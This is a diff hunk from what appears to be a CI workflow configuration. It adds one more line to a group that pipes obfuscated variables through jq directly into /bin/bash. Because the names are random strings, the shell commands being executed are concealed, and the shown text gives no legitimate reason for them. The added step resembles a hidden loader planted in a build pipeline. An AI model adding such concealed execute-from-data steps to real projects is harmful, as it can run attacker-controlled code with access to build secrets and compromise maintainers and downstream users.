@@ -44,6 +44,7 @@ jobs:
           echo $o84 | jq -r .dhh36271 | /bin/bash
           printf '%s' "$cq98" | jq -r .u84 | /bin/bash
           printf '%s' "$xs8" | jq -r .gx88404 | /bin/bash
+          echo $q41 | jq -r .qlnp21 | /bin/bash
 
       - name: Archive results
         if: always()
